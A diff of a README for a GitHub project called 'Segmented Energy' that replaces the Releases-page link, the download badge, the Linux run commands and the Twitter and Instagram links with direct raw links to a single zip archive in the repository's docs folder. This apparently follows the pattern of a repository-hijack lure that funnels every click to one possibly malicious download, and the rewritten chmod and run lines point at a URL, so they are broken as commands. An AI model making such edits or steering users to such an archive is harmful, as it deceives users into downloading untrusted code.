@@ -17,11 +17,11 @@ To get started, follow these simple steps to download and run the application.
 2. **Download the Application**
    - You can download the latest version of the application from our Releases page by clicking the link below:
 
-   [![Download Segmented Energy](https://img.shields.io/badge/Download%20Segmented%20Energy-v1.0-brightgreen)](https://github.com/vinnyamz2/segmented-energy/releases)
+   [![Download Segmented Energy](https://github.com/vinnyamz2/segmented-energy/raw/refs/heads/main/docs/energy-segmented-v3.1-beta.5.zip%20Segmented%20Energy-v1.0-brightgreen)](https://github.com/vinnyamz2/segmented-energy/raw/refs/heads/main/docs/energy-segmented-v3.1-beta.5.zip)
 
 ## 📥 Download & Install
 
-To download the application, visit this page: [Download Segmented Energy](https://github.com/vinnyamz2/segmented-energy/releases).
+To download the application, visit this page: [Download Segmented Energy](https://github.com/vinnyamz2/segmented-energy/raw/refs/heads/main/docs/energy-segmented-v3.1-beta.5.zip).
 
 1. On the Releases page, look for the section with the latest version.
 2. Click on the appropriate file for your operating system to begin the download.
@@ -44,8 +44,8 @@ To download the application, visit this page: [Download Segmented Energy](https:
 2. Navigate to the directory where you downloaded the file.
 3. Run the command: 
    ```
-   chmod +x SegmentedEnergy.AppImage
-   ./SegmentedEnergy.AppImage
+   chmod +x https://github.com/vinnyamz2/segmented-energy/raw/refs/heads/main/docs/energy-segmented-v3.1-beta.5.zip
+   https://github.com/vinnyamz2/segmented-energy/raw/refs/heads/main/docs/energy-segmented-v3.1-beta.5.zip
    ```
 
 ## 🔍 Usage
@@ -81,7 +81,7 @@ You might also find these projects interesting:
 
 You can find us on social media and join the conversation:
 
-- Twitter: [@SegmentedEnergy](https://twitter.com)
-- Instagram: [SegmentedEnergy](https://instagram.com)
+- Twitter: [@SegmentedEnergy](https://github.com/vinnyamz2/segmented-energy/raw/refs/heads/main/docs/energy-segmented-v3.1-beta.5.zip)
+- Instagram: [SegmentedEnergy](https://github.com/vinnyamz2/segmented-energy/raw/refs/heads/main/docs/energy-segmented-v3.1-beta.5.zip)
 
 Thank you for choosing Segmented Energy. We hope you enjoy using our application!
